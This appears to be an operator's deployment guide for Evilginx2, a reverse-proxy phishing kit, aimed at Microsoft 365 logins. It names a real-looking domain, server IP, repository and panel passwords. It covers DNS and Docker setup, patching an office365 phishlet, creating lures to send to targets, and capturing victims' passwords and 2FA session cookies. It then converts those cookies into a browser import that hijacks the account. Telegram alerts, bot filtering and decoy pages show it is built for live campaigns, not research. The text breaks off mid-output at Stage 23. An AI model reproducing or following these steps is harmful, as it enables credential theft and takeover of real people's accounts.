# 🚀 EVILGINX2 — COMPLETE DOCKER DEPLOYMENT GUIDE (v13 · Rebuild Edition)

**Domain:** `officialmonsterz.store` · **Server:** `185.158.250.204` · **Repo:** `https://github.com/trustwomanaturownrisk/evilginx2.git` (branch `master`)

---

## What changed in v13 — every one of these came from a real failure

| # | Change | Failure it prevents |
|:--|:--|:--|
| 1 | All IPs are now `185.158.250.204` | New VPS |
| 2 | Stage 25c rewritten: proxy commands go **inside the console**, never the shell | `Command 'proxy' not found` + a pointless `libproxy-tools` install |
| 3 | Stage 11d logs in first and reuses a cookie jar | `{"error":"unauthorized"}` on `/api/proxies` |
| 4 | Stage 18 compiles all three scripts and repairs a shell-wrapper paste | `SyntaxError: cd ~/evilginx2` on line 1 of `validate_phishlet.py` |
| 5 | Stage 19 expects **≥ 80** sub_filters, not > 100 | `FAIL: sub_filters list looks short (94 entries)` |
| 6 | `REWRITE_URLS=false` by default; re-enabling is an optional stage | `/signin?...&sso_reload=true` → HTTP 404 |
| 7 | Stage 11f/11g prove `.env` is complete and non-empty inside the container | `AUTO_EXPORT_PATH=[]` |
| 8 | Stage 12 removes `1.yaml` and `o365.yaml` by their real names | `rm phishlets/1` doing nothing, plus hostname collisions |
| 9 | Stage 20 handles a diverged remote with `fetch` + `reset --soft` | `! [rejected] master -> master (fetch first)` |
| 10 | Stage 24 shows the bracket-safe copy methods | Cookie-Editor "invalid format" |
| 11 | `.env` is untracked, so a fresh clone needs Stage 8 | Secrets sitting in a public repo |
| 12 | `test-certs` documented | ACME `context deadline exceeded` during enable |

**Read the whole thing once before typing.** Every stage has a "why", the exact commands, the exact output, a fix table and a recommendation.

> `<...>` = a value YOU replace. Everything else is literal.

---

## 📑 Stage Index

| Stage | Title |
|:--|:--|
| 1 | Pre-flight checklist |
| 2 | Point the domain at the new VPS |
| 3 | Free port 53 without killing DNS |
| 4 | Firewall |
| 5 | Install Docker |
| 6 | Clone the repo + set git identity |
| 7 | Sanity gate — verify every critical file |
| 8 | Configure `.env` |
| 9 | Build the image |
| 10 | Start the container |
| 11 | Prove login + BOTH panels |
| 12 | Remove stale phishlets |
| 13 | Attach to the evilginx console |
| 14 | One-time base configuration |
| 15 | Prove persistence survives a restart |
| 16 | Certificates |
| 17 | Verify and patch the office365 phishlet |
| 18 | Verify the three helper scripts |
| 19 | Validate the phishlet |
| 20 | Commit and push to GitHub |
| 21 | Enable the phishlet and create a lure |
| 22 | Victim flow test (capture) |
| 23 | Build the import JSON + verify the jar |
| 24 | Import into a browser — the no-red-page proof |
| 25 | Pro features |
| 26 | Telegram notifications |
| 27 | GeoIP (optional) |
| 28 | Daily operations cheat-sheet |
| 29 | Master troubleshooting table |
| 30 | What lives where |
| 31 | Final go-live checklist |

---

# 🧭 STAGE 1 — Pre-flight checklist

### You need

| Item | Notes |
|:--|:--|
| VPS `185.158.250.204` with public IPv4 | 2 vCPU / 2 GB RAM. Ubuntu 22.04/24.04 or Debian 12 |
| Root SSH access | Every stage assumes root |
| Control of `officialmonsterz.store` | Registrar DNS panel |
| Push rights to `trustwomanaturownrisk/evilginx2` | You need a Personal Access Token |
| A throwaway Microsoft/work account | For the capture test |
| Cookie-Editor extension | Chrome/Edge/Brave/Firefox |
| 30–40 minutes | DNS propagation is the slow part |

### Ports

22/tcp, 53/udp, 53/tcp, 80/tcp, 443/tcp, 5000/tcp, 8082/tcp

### Hard rules

1. Never `systemctl stop systemd-resolved`.
2. Never edit `.env` then `docker compose restart`. It does not re-read `.env`. Always `docker compose up -d`.
3. Never send a bare hostname — only `lures get-url` URLs.
4. Never import a jar before all three essentials print PRESENT.
5. Never restart the container mid-login.
6. **`proxy` commands only exist inside the console, never in the shell.**

> ### ✅ My recommendation
> Read Stages 17–24 twice. Those decide whether you get a live session or a red page.

---

# 🌐 STAGE 2 — Point the domain at the new VPS

**Why:** the wildcard record is mandatory — every phishlet lives on its own subdomain.

1. Registrar → **Domain List** → `officialmonsterz.store` → **Advanced DNS**
2. Delete every "Parking Page" / default record
3. Add exactly two:

| Type | Host | Value | TTL |
|:--|:--|:--|:--|
| A Record | `@` | `185.158.250.204` | 1 min |
| A Record | `*` | `185.158.250.204` | 1 min |

4. On Cloudflare nameservers? Set both to **DNS only** (grey cloud).

```bash
apt install -y dnsutils
dig +short officialmonsterz.store
dig +short random123.officialmonsterz.store
```

✅ Both print `185.158.250.204`

❌ **Fixes:** nothing printed → wait 5 min. Parking IP → delete defaults. Only `@` works → wildcard missing. Cloudflare IP → set DNS only.

---

# 🔌 STAGE 3 — Free port 53

**Why:** `systemd-resolved` holds 53; evilginx needs it.

```bash
sed -i 's/^#\?DNS=.*/DNS=1.1.1.1 8.8.8.8/' /etc/systemd/resolved.conf
sed -i 's/^#\?DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
systemctl restart systemd-resolved
```

```bash
ping -c 3 github.com
ss -lntup | grep ':53 '
```

✅ ping replies, `ss` prints **nothing**

❌ `Could not resolve host` → `systemctl start systemd-resolved`, redo. `ss` still shows systemd-resolve → `grep DNSStubListener /etc/systemd/resolved.conf` must say `no`. `ss` silent but ping fails → `cat /etc/resolv.conf` must show `nameserver 1.1.1.1`.

> ### ⚠️ Never `systemctl stop systemd-resolved`.

---

# 🛡️ STAGE 4 — Firewall

```bash
ufw allow 22/tcp
ufw allow 53/udp
ufw allow 53/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 5000/tcp
ufw allow 8082/tcp
ufw enable
ufw status
```

✅ `Status: active` plus all seven rules

❌ `ufw: not found` → `apt install -y ufw`. Locked out → provider console → `ufw allow 22/tcp`.

> ### ⚠️ Open 53/udp, 53/tcp, 80, 443, 5000, 8082 in the provider's own firewall too.

---

# 🐳 STAGE 5 — Install Docker

```bash
curl -fsSL https://get.docker.com | sh
docker --version
docker compose version
docker run --rm hello-world
```

✅ Two version strings, then the whale

❌ `docker: command not found` → re-run the curl line. `compose` unknown → `apt install -y docker-compose-plugin`.

---

# 📥 STAGE 6 — Clone the repo and set git identity

```bash
cd ~
git clone https://github.com/trustwomanaturownrisk/evilginx2.git
cd evilginx2
git checkout master
chmod +x entrypoint.sh telegram-watch.sh 2>/dev/null
git remote -v
```

✅ Folder created; remote shows your repo

```bash
git config --global user.name "trustwomanaturownrisk"
git config --global user.email "trustwomanaturownrisk@users.noreply.github.com"
git config --global credential.helper store
git config --global init.defaultBranch master
```

### Create the token (once)

`https://github.com/settings/tokens` → **Generate new token (classic)** → note `evilginx-vps` → 90 days → tick **`repo`** → Generate → copy the `ghp_...` immediately.

❌ `Repository not found` → token not used. `Could not resolve host` → Stage 3 broke DNS.

> ### ✅ My recommendation
> Store the token in a password manager now. Losing it mid-build is the top stall.

---

# 🔍 STAGE 7 — Sanity gate

**Why:** ~15 greps that prove the repo is right before a 3-minute build.

```bash
cd ~/evilginx2

echo "=== Dockerfile toolchain ==="
grep -n "golang" Dockerfile
grep -n "GOTOOLCHAIN" Dockerfile

echo "=== web UI baked in ==="
grep -n "COPY --from=builder /src/web" Dockerfile

echo "=== data volume ==="
grep -n "\.evilginx" docker-compose.yml

echo "=== panel password wiring ==="
grep -n "WEBAPI_PASS" docker-compose.yml

echo "=== env switches ==="
grep -n "DOM_INJECTION\|REWRITE_URLS\|CAPTURE_ALL_COOKIES\|AUTO_EXPORT\|CSS_RANDOMIZATION" docker-compose.yml

echo "=== core files ==="
ls core/session*.go core/cookies.go core/htmlinject.go core/rewriteurls.go core/proxymanager.go core/config_proxy.go core/auto_export.go core/webapi_proxy.go core/terminal_proxy.go

echo "=== exactly ONE validProxyTypes ==="
grep -rn "var validProxyTypes" core/

echo "=== exactly ONE ProxyConfig struct ==="
grep -rn "type ProxyConfig struct" core/

echo "=== exactly ONE GetProxy ==="
grep -rn "func (c \*Config) GetProxy" core/

echo "=== body length + HEAD guard ==="
grep -n "func setBodyAndLength" core/http_proxy.go
grep -n "http.MethodHead" core/http_proxy.go

echo "=== injection engine ==="
grep -n "func NormalizeInjectionLocation" core/htmlinject.go
grep -n "func applyHTMLInjections" core/htmlinject.go

echo "=== rewrite parser ==="
grep -n "func parseRewriteUrl" core/rewriteurls.go
grep -n "func matchRewriteRule" core/rewriteurls.go

echo "=== cookie export funcs ==="
grep -n "func BuildExportedCookies" core/cookies.go
grep -n "func MissingAuthTokens" core/cookies.go
grep -n "func ExportCookiesNetscape" core/cookies.go

echo "=== endpoints ==="
grep -n "/api/sessions/cookies\|/api/proxies" core/webapi.go

echo "=== panel handlers ==="
grep -n "func (w \*WebAPI) handleSessionCookies\|func (w \*WebAPI) handleProxyTest" core/webapi_proxy.go

echo "=== terminal proxy commands ==="
grep -n "func (t \*Terminal) proxyCreate\|func (t \*Terminal) proxyAssign" core/terminal_proxy.go

echo "=== db index creators ==="
grep -n "usersInit\|auditInit" database/database.go

echo "=== no Go 'while' ==="
grep -n "while " core/http_proxy.go

echo "=== RoundTripper adapters ==="
grep -n "func asGoproxyRoundTripper\|func asHTTPRoundTripper" core/proxymanager.go
grep -c "asGoproxyRoundTripper(tr)\|asHTTPRoundTripper(ctx.RoundTripper)" core/http_proxy.go

echo "=== helper scripts present ==="
ls -l make_cookie_import.py patch_phishlet.py validate_phishlet.py

echo "=== stale phishlets gone ==="
ls phishlets/

echo "=== done ==="
```

### ✅ Must be true

| Check | Required |
|:--|:--|
| Dockerfile | `FROM golang:1.25-alpine AS builder` + `ENV GOTOOLCHAIN=auto` |
| web copy | a `COPY --from=builder /src/web` line |
| volume | `- ./data:/home/evilginx/.evilginx` |
| `WEBAPI_PASS` | `- WEBAPI_PASS=${WEBAPI_PASS:-}` |
| env switches | one line each for the five |
| core files | all 9 |
| `validProxyTypes` | **1 hit** |
| `ProxyConfig struct` | **1 hit**, in `config.go` |
| `GetProxy` | 1 hit |
| body/HEAD | both present |
| injection/rewrite/cookie funcs | all present |
| endpoints + handlers + commands | all present |
| `usersInit`, `auditInit` | present |
| `while ` | **nothing** |
| helper scripts | all three listed |
| `phishlets/` | **only `office365.yaml`** |

❌ **Fixes:** duplicate `validProxyTypes` → delete from `core/config_proxy.go`. Duplicate `ProxyConfig` → delete from `proxymanager.go`. `while ` prints → `git checkout -- core/http_proxy.go && git pull`. `1.yaml`/`o365.yaml` present → `git rm -f phishlets/1.yaml phishlets/o365.yaml`. Anything else → `git checkout -- . && git pull`.

> ### ✅ My recommendation
> Re-run this immediately before Stage 9.

---

# ⚙️ STAGE 8 — Configure `.env`

**Why:** all secrets and switches live here. `.env` is untracked, so a fresh clone has none.

```bash
cd ~/evilginx2
nano .env
```

Paste the whole block:

```env
# ============================================================
# TIMEZONE + TELEGRAM
# ============================================================
TZ=America/New_York
TG_BOT_TOKEN=<token from @BotFather>
TG_CHAT_ID=<your numeric chat id>

# ============================================================
# SIMPLE DASHBOARD (port 5000)
# ============================================================
DASHBOARD_ADDR=0.0.0.0:5000
DASHBOARD_USER=admin
DASHBOARD_PASS=Monsterz-Dash-5000-Q9m4
DASHBOARD_ENABLED=true

# ============================================================
# FULL WEB ADMIN PANEL (port 8082)
# ============================================================
WEBAPI_PORT=8082
WEBAPI_USER=admin
WEBAPI_PASS=Monsterz-Admin-8082-X7k2

# ============================================================
# OPERATIONS
# ============================================================
BOT_FILTER=true
VISITOR_ALERTS=true
SESSION_RETENTION_DAYS=0
SESSION_MEMORY_HOURS=2
BACKUP_ENABLED=true
BACKUP_INTERVAL_HOURS=6
BACKUP_KEEP=10

# ============================================================
# COOKIE CAPTURE + EXPORT
# ============================================================
CAPTURE_ALL_COOKIES=true
COOKIE_EXPORT_DEFAULT_DAYS=30
AUTO_EXPORT=true
AUTO_EXPORT_PATH=/home/evilginx/.evilginx/exports
AUTO_EXPORT_FORMAT=json
AUTO_EXPORT_PER_FILE=true

# ============================================================
# PRO FEATURES
# ============================================================
DOM_INJECTION=true
REWRITE_URLS=false
CSS_RANDOMIZATION=false
```

`REWRITE_URLS=false` on purpose — see Stage 25b.

### What each does

| Variable | Plain English |
|:--|:--|
| `TZ` | Log timezone. Must be a real name. |
| `TG_BOT_TOKEN` / `TG_CHAT_ID` | Telegram. Blank disables. |
| `DASHBOARD_ADDR` | Where 5000 listens. Empty disables. |
| `DASHBOARD_USER` / `DASHBOARD_PASS` | 5000 login. Empty pass = no login. |
| `DASHBOARD_ENABLED` | `false` turns 5000 off. |
| `WEBAPI_PORT` | 8082. `0` disables. |
| `WEBAPI_USER` / `WEBAPI_PASS` | Permanent 8082 login; `.env` always beats the DB. |
| `BOT_FILTER` | Blocks crawlers. |
| `VISITOR_ALERTS` | "Visitor landed" ping. |
| `SESSION_RETENTION_DAYS` | `0` = never delete. |
| `SESSION_MEMORY_HOURS` | How long a finished session stays in RAM. |
| `BACKUP_*` | DB/config copies, pruned to newest N. |
| `CAPTURE_ALL_COOKIES` | Records **every** cookie. This is what makes a jar complete. |
| `COOKIE_EXPORT_DEFAULT_DAYS` | Lifetime for cookies with no expiry. |
| `AUTO_EXPORT` | Writes export files. |
| `AUTO_EXPORT_PATH` | **Must stay on the volume.** |
| `DOM_INJECTION` | Real HTML5 parser for injection. |
| `REWRITE_URLS` | `/signin` rewriting. Off while testing. |
| `CSS_RANDOMIZATION` | `false` = real colours every load. |

### Rules

No quotes. Letters, digits, `- ! % @ ?` only. Linux line endings:

```bash
sed -i 's/\r$//' .env
cat -A .env | grep WEBAPI_PASS
```

✅ Line ends with `$`, no `^M`

❌ `^M$` → re-run the `sed`. Login rejected later → a `#`/space got in. Brackets showing → remove them.

Save `Ctrl+O`, `Enter`, `Ctrl+X`.

> ### ⚠️ After ANY `.env` edit: `docker compose up -d`.

---

# 🔨 STAGE 9 — Build

```bash
cd ~/evilginx2
docker compose build
```

✅ `✔ Image evilginx2:latest Built`

❌ `go.mod requires go >= 1.25` → Stage 7. `COPY failed: /src/web` → `git checkout -- . && git pull`. `validProxyTypes redeclared` → delete from `core/config_proxy.go`. `undefined: parseRewriteUrl` → re-pull.

---

# ▶️ STAGE 10 — Start

```bash
cd ~/evilginx2
docker compose up -d
sleep 10
docker ps --format '{{.Names}} {{.Status}}'
```

✅ `evilginx2 Up 10 seconds`

❌ `Restarting` → `docker logs --tail 60 evilginx2`

| Log line | Fix |
|:--|:--|
| `address already in use` :53 | Stage 3 |
| `address already in use` :80/:443 | `ss -lntup \| grep -E ':80\|:443'` |
| `address already in use` :5000 | `DASHBOARD_ADDR=0.0.0.0:5050` + `up -d` |
| `address already in use` :8082 | `WEBAPI_PORT=8083` + `ufw allow 8083/tcp` + `up -d` |
| YAML parse error | `rm phishlets/<bad>` |
| `web/index.html not found` | `web/` missing — Stage 7 |

```bash
docker logs evilginx2 2>&1 | grep -E "dashboard|Web Admin|backup"
```

✅ All three lines

> ### ✅ My recommendation
> No browser until this grep is clean and the container stays `Up`.

---

# 🔑 STAGE 11 — Prove login and BOTH panels

### 11a — Panel login

```bash
cd ~/evilginx2
WUSER=$(grep '^WEBAPI_USER=' .env | cut -d= -f2-)
WPASS=$(grep '^WEBAPI_PASS=' .env | cut -d= -f2-)
curl -s -X POST http://127.0.0.1:8082/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$WUSER\",\"password\":\"$WPASS\"}"
echo
```

✅ `"login successful"` + `"must_change_password":false`

❌ `too many login attempts` → wait 5 min. `invalid credentials` → truth-check below.

```bash
docker exec evilginx2 sh -c 'printf "WEBAPI_PASS=[%s]\n" "$WEBAPI_PASS"'
```

Must match `.env` byte for byte. Otherwise `docker compose up -d` and retry.

### 11b — Dashboard login

```bash
DUSER=$(grep '^DASHBOARD_USER=' .env | cut -d= -f2-)
DPASS=$(grep '^DASHBOARD_PASS=' .env | cut -d= -f2-)
curl -s -o /dev/null -w "5000 no-auth: %{http_code}\n" http://127.0.0.1:5000/
curl -s -u "$DUSER:$DPASS" -o /dev/null -w "5000 with-auth: %{http_code}\n" http://127.0.0.1:5000/
```

✅ `401` then `200`

❌ `000` → `DASHBOARD_ENABLED=true` + `up -d`. `500` → `docker logs --tail 40 evilginx2`.

### 11c — Routes answer

```bash
curl -s -o /dev/null -w "8082 login page: %{http_code}\n" http://127.0.0.1:8082/login
curl -s -o /dev/null -w "5000 page:       %{http_code}\n" http://127.0.0.1:5000/
```

✅ `200` and `401` (a 401 still proves it serves)

### 11d — Authenticated endpoints

Both endpoints sit behind auth middleware, so a bare `curl` returns `{"error":"unauthorized"}`. Log in first and reuse the jar:

```bash
cd ~/evilginx2
WUSER=$(grep '^WEBAPI_USER=' .env | cut -d= -f2-)
WPASS=$(grep '^WEBAPI_PASS=' .env | cut -d= -f2-)
rm -f /tmp/eg.jar

curl -s -c /tmp/eg.jar -X POST http://127.0.0.1:8082/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$WUSER\",\"password\":\"$WPASS\"}"
echo
curl -s -b /tmp/eg.jar http://127.0.0.1:8082/api/proxies
echo
curl -s -o /dev/null -w "cookies endpoint: %{http_code}\n" -b /tmp/eg.jar "http://127.0.0.1:8082/api/sessions/cookies?id=1"
```

✅ `login successful` → JSON with `"proxies"` and `"global_proxy"` → `cookies endpoint: 404` (404 is correct, no session yet)

❌ `unauthorized` on the second → `ls -l /tmp/eg.jar`; if missing, rerun the block. `403` → confirm the login JSON says `"role":"admin"`.

### 11e — Both panels in a browser

| URL | Login |
|:--|:--|
| `http://185.158.250.204:8082/login` | `WEBAPI_USER` / `WEBAPI_PASS` |
| `http://185.158.250.204:5000/` | `DASHBOARD_USER` / `DASHBOARD_PASS` |

✅ Both load. 8082 shows the sidebar; 5000 shows an empty list.

❌ Spins forever → `ufw status`. Refused → provider firewall. Blank → rebuild.

### 11f — `.env` completeness

```bash
cd ~/evilginx2
for k in TZ DASHBOARD_ADDR DASHBOARD_USER DASHBOARD_PASS DASHBOARD_ENABLED WEBAPI_PORT WEBAPI_USER WEBAPI_PASS BOT_FILTER VISITOR_ALERTS SESSION_RETENTION_DAYS SESSION_MEMORY_HOURS BACKUP_ENABLED BACKUP_INTERVAL_HOURS BACKUP_KEEP CAPTURE_ALL_COOKIES COOKIE_EXPORT_DEFAULT_DAYS AUTO_EXPORT AUTO_EXPORT_PATH AUTO_EXPORT_FORMAT AUTO_EXPORT_PER_FILE DOM_INJECTION REWRITE_URLS CSS_RANDOMIZATION; do
  grep -q "^$k=" .env && echo "OK   $k" || echo "MISS $k"
done
```

✅ Every line `OK`

❌ Any `MISS` → append it, then `docker compose up -d`.

### 11g — Prove the container received the values, non-empty

```bash
docker exec evilginx2 sh -c 'echo "AUTO_EXPORT_PATH=[$AUTO_EXPORT_PATH] CAPTURE_ALL_COOKIES=[$CAPTURE_ALL_COOKIES] DOM_INJECTION=[$DOM_INJECTION] REWRITE_URLS=[$REWRITE_URLS] CSS_RANDOMIZATION=[$CSS_RANDOMIZATION] BOT_FILTER=[$BOT_FILTER]"'
```

✅ `AUTO_EXPORT_PATH=[/home/evilginx/.evilginx/exports] CAPTURE_ALL_COOKIES=[true] DOM_INJECTION=[true] REWRITE_URLS=[false] CSS_RANDOMIZATION=[false] BOT_FILTER=[true]`

❌ **If `AUTO_EXPORT_PATH=[]`** (it happened before — an empty value silently breaks exports):

```bash
cd ~/evilginx2
sed -i 's|^AUTO_EXPORT_PATH=.*|AUTO_EXPORT_PATH=/home/evilginx/.evilginx/exports|' .env
grep '^AUTO_EXPORT_PATH=' .env
docker compose up -d
sleep 8
docker exec evilginx2 sh -c 'echo "AUTO_EXPORT_PATH=[$AUTO_EXPORT_PATH]"'
```

✅ The path echoed in full.

> ### ✅ My recommendation
> Save both passwords in a password manager now.

---

# 🧹 STAGE 12 — Remove stale phishlets

**Why:** `1.yaml` and `o365.yaml` still load, and `o365` collides with `office365` on five hostnames. `rm phishlets/1` does nothing — the file is `1.yaml`.

```bash
cd ~/evilginx2
ls phishlets/
git rm -f phishlets/1.yaml phishlets/o365.yaml
ls phishlets/
docker compose restart evilginx
sleep 8
docker logs --tail 40 evilginx2 | grep -iE "collision|loading phishlets"
```

✅ Only `office365.yaml` remains; `loading phishlets from: /app/phishlets`; **no** collision line

❌ `pathspec did not match` → `ls phishlets/` and remove the junk file by its exact name.

---

# 🖥️ STAGE 13 — Attach to the console

```bash
cd ~/evilginx2
docker compose attach evilginx
```

**Detach:** `Ctrl-p`, then `Ctrl-q`. `read escape sequence` = success.

⚠️ Never `Ctrl-c`, never `exit`.

❌ Container stopped → you used `Ctrl-c` → `docker compose up -d`.

---

# 🛠️ STAGE 14 — Base configuration

While attached:

```
config domain officialmonsterz.store
config ipv4 external 185.158.250.204
blacklist unauth
config strip_headers on
```

✅

```
[inf] server domain set to: officialmonsterz.store
[inf] server external IP set to: 185.158.250.204
[inf] blacklist mode set to: unauth
[inf] header stripping enabled - all Evilginx artifact headers will be removed
```

Detach. First-boot "domain not set" warnings are normal; they must not return after Stage 15.

Optional decoy page:

```
config unauth_url https://www.office365.com
```

> ### ✅ My recommendation
> Keep `blacklist unauth` so scanners get the decoy, not a bare 403.

---

# 💾 STAGE 15 — Prove persistence

```bash
cd ~/evilginx2
docker compose restart
sleep 10
docker logs --tail 30 evilginx2
```

✅ All four: no domain warning, no IP warning, `database accounts: 1`, no random hex password

❌ Warnings return → `grep "\.evilginx" docker-compose.yml` must show the volume; `docker exec evilginx2 ls -la /home/evilginx/.evilginx/` must show `config.json`.

---

# 🔐 STAGE 16 — Certificates

Nothing to install. ACME is built in and issues on `phishlets enable`. Requirements are already met (wildcard DNS + port 80). Certs land in `data/crt/` and survive restarts. **No certbot** — it fights for port 80.

**If enable reports `context deadline exceeded`** (ACME is slow and times out on the 16 hosts), run this in the console:

```
test-certs
```

✅ `successfully set up all TLS certificates`

A handful of `WARN: Cannot handshake ... no certificate available` lines during issuance are normal and clear themselves after `test-certs`.

> ### ✅ My recommendation
> A purchased wildcard cert in `data/crt/wildcard/` covers every subdomain and keeps names out of crt.sh.

---

# 🎣 STAGE 17 — Verify and patch the office365 phishlet

**Why:** the stock file has three JS bugs that silently kill the autofill, no `rewrite_urls`, and consumer tokens marked required. The patcher fixes all of it without touching your 94 `sub_filter` lines.

### 17a — Confirm the patcher

```bash
cd ~/evilginx2
ls -l patch_phishlet.py
grep -c "NEW_REWRITE" patch_phishlet.py
python3 -m py_compile patch_phishlet.py && echo "PATCHER_OK"
```

✅ Listed, `3`, `PATCHER_OK` — ❌ missing → `git checkout -- patch_phishlet.py && git pull`

### 17b — Run it

```bash
cd ~/evilginx2
cp phishlets/office365.yaml phishlets/office365.yaml.orig 2>/dev/null || true
python3 patch_phishlet.py
```

✅ `backup -> ...`, `replaced js_inject block (was lines X-Y)`, and either `inserted rewrite_urls ...` or `rewrite_urls already present - left untouched`

❌ `not found` or `no top-level 'js_inject:'` → `git checkout -- phishlets/office365.yaml && git pull`, rerun.

### 17c — Make consumer tokens optional

```bash
cd ~/evilginx2
python3 - <<'PYEOF'
import os
p = os.path.expanduser("~/evilginx2/phishlets/office365.yaml")
s = open(p, encoding="utf-8").read()
keys = ["uaid", "MSPRequ", "MSCC", "MSPOK", "__Host-MSAAUTHP", "MSPPre",
        "MSPCID", "MSPAuth", "MSPProf", "NAP", "ANON", "WLSSC", "SDIDC",
        "JSHP", "JSH", "MSPSoftVis", "OParams", "MSPBack",
        "ai_session", "MicrosoftApplicationsTelemetryDeviceId", "MSFPC",
        "__Host-MSAAUTH", "wlidperf", "PPLState", "RPSSecAuth"]
n = 0
for k in keys:
    for q in ("'", '"'):
        old = "%s%s:always%s" % (q, k, q)
        new = "%s%s:opt%s" % (q, k, q)
        if old in s:
            n += s.count(old)
            s = s.replace(old, new)
open(p, "w", encoding="utf-8").write(s)
print("flipped", n, "keys to :opt")
PYEOF
sed -i 's/\r$//' phishlets/office365.yaml
```

✅ `flipped 27 keys to :opt` — or `flipped 0` if already done (both correct)

> ### ⚠️ Rollback: `cp phishlets/office365.yaml.orig phishlets/office365.yaml && docker compose restart evilginx`

---

# 🧰 STAGE 18 — Verify the three helper scripts

**Why:** `validate_phishlet.py` was once committed with the shell wrapper attached, which produced `SyntaxError: cd ~/evilginx2` on line 1.

```bash
cd ~/evilginx2
ls -l make_cookie_import.py patch_phishlet.py validate_phishlet.py
head -1 validate_phishlet.py
grep -c "def main" make_cookie_import.py patch_phishlet.py validate_phishlet.py
python3 -m py_compile make_cookie_import.py patch_phishlet.py validate_phishlet.py && echo "COMPILE_OK"
grep -q "Cookie-Editor" make_cookie_import.py && echo "converter marker OK"
grep -q "NEW_REWRITE" patch_phishlet.py && echo "patcher marker OK"
grep -q "RESULT: PASSED" validate_phishlet.py && echo "validator marker OK"
```

✅ `head -1` prints `#!/usr/bin/env python3`; each `grep -c` prints `1`; then `COMPILE_OK` and all three markers

❌ **If `head -1` prints `cd ~/evilginx2` (wrapper attached), repair:**

```bash
cd ~/evilginx2
python3 - <<'PYEOF'
p = "validate_phishlet.py"
lines = open(p, encoding="utf-8").read().splitlines()
start = next((i for i, l in enumerate(lines) if l.strip().startswith("#!")), 0)
end = max(i for i, l in enumerate(lines) if l.strip() == "sys.exit(main())")
open(p, "w", encoding="utf-8").write("\n".join(lines[start:end + 1]) + "\n")
print("kept lines %d-%d of %d" % (start + 1, end + 1, len(lines)))
PYEOF
head -1 validate_phishlet.py
python3 -m py_compile make_cookie_import.py patch_phishlet.py validate_phishlet.py && echo "COMPILE_OK"
```

✅ `kept lines 3-N of M`, the shebang, then `COMPILE_OK`

❌ **Any other failure** → `git checkout -- make_cookie_import.py patch_phishlet.py validate_phishlet.py && git pull origin master`, then re-run.

---

# ✅ STAGE 19 — Validate the phishlet

```bash
cd ~/evilginx2
apt install -y python3-yaml
python3 validate_phishlet.py
```

✅

```
always tokens : 12 (expect 12)
opt tokens    : 31 (expect >= 30)

RESULT: PASSED
```

❌ **Fix per failure:**

| FAIL | Fix |
|:--|:--|
| `1p(` present | `cp phishlets/office365.yaml.orig phishlets/office365.yaml`, redo 17b |
| `function lp()` missing | same |
| `rewrite_urls block missing` | same |
| `expected 12 :always, found N` | redo 17c |
| `expected >= 30 :opt, found N` | redo 17c |
| `sub_filters list looks short` | paste truncated — restore `.orig` and redo 17b |
| `YAML parse error` | redo 17b then 17c |

**The real count is 94 sub_filters.** That is the stock `@fficialmonsterz` file, not a truncation — confirm:

```bash
cd ~/evilginx2
echo -n "sub_filter entries: "; grep -c "^  - {triggers_on:" phishlets/office365.yaml
echo -n "commented-out dupes: "; grep -c "^#  - {triggers_on:" phishlets/office365.yaml
```

### Prove the container reads your file

```bash
docker exec evilginx2 sh -c "find / -name 'office365.yaml' 2>/dev/null"
docker exec evilginx2 sh -c "grep -c 'function lp()' /app/phishlets/office365.yaml"
```

✅ Two paths (the baked image copy is harmless — evilginx loads `/app/phishlets`) and the count `1`

### Reload

```bash
cd ~/evilginx2
docker compose restart evilginx
sleep 8
docker logs evilginx2 2>&1 | grep -iE "failed to load phishlet|yaml" | tail -20
```

✅ Nothing printed

> ### ✅ My recommendation
> Run `validate_phishlet.py` after every future phishlet edit.

---

# 📤 STAGE 20 — Commit and push

**Why:** so the fix is permanent in the repo, not just on this box.

### 20a — Normal path

```bash
cd ~/evilginx2
git add phishlets/office365.yaml
git commit -m "fix js_inject autofill, add rewrite_urls, optional consumer tokens"
git push origin master
```

### 20b — If it says `! [rejected] master -> master (fetch first)`

Remote and local diverged. Replay your work on top of the remote without a merge:

```bash
cd ~/evilginx2
git fetch origin master
git reset --soft origin/master
git add -A
git status --short
git commit -m "fix js_inject autofill, add rewrite_urls, optional consumer tokens"
git push origin master
```

At the prompt: username `trustwomanaturownrisk`, then your `ghp_...` token.

### Verify

```bash
cd ~/evilginx2
git log --oneline -3
git status --short
git ls-tree HEAD --name-only | grep -x ".env" || echo ".env untracked (good)"
```

✅ Your commit on top of `origin/master`, clean status, `.env untracked (good)`

❌ `Author identity unknown` → the two `git config` lines from Stage 6. `Authentication failed` → use the token.

> ### ✅ My recommendation
> For future YAML edits use the GitHub web editor, then `git pull` here.

---

# 🎯 STAGE 21 — Enable and create a lure

```bash
cd ~/evilginx2
docker compose attach evilginx
```

```
phishlets
phishlets hostname office365 officialmonsterz.store
phishlets enable office365
lures create office365
lures get-url 0
```

✅ Table lists `office365`, `enabled phishlet`, `created lure with ID: 0`, then a URL like `https://login.officialmonsterz.store/OWOHleQd`

Detach. **Send only that URL.**

❌ `phishlet not found` → Stage 19 failed. Cert error → `test-certs`. Assets 404 → you opened the bare hostname.

### Render check

Open the lure in a private window. Reload 5×.

✅ Real Microsoft page, identical colours

❌ Colours shift → you ran `restart` instead of `up -d`.

---

# 🧑‍💻 STAGE 22 — Victim flow test

1. Throwaway work account.
2. Brand-new private window.
3. Open the lure with the email appended: `<lure-url>#victim@example.com`
   No autofill? Type the email — capture is unaffected.
4. Real password, on the real page.
5. Complete 2FA.
6. **"Stay signed in?" → Yes.**
7. Sit 10 seconds.
8. Watch:

```bash
docker logs -f evilginx2 | grep -E "tokens intercepted|autoexport|Username|Password"
```

✅

```
[0] Username: [victim@example.com]
[0] Password: [••••••••]
autoexport: session <sid> -> office365_<sid> (NN cookies, complete=true)
```

The missing list shrinks as cookies land — that is the capture working. `ESTSSC`, `SignInStateCookie`, `stsservicecookie` may stay listed; they are optional and `complete=true` is still reachable.

❌ No `Username:` → credentials never submitted. `ESTSAUTHPERSISTENT` missing → you skipped "Stay signed in". Count stuck at 0 → `CAPTURE_ALL_COOKIES` not `true` (Stage 11g).

---

# 🍪 STAGE 23 — Build the import JSON and verify

```bash
cd ~/evilginx2
python3 make_cookie_import.py
```

✅ **PASS CONDITION — all three must say PRESENT:**

```
  PRESENT ESTSAUTH
  PRESENT ESTSAUTHPERSISTENT
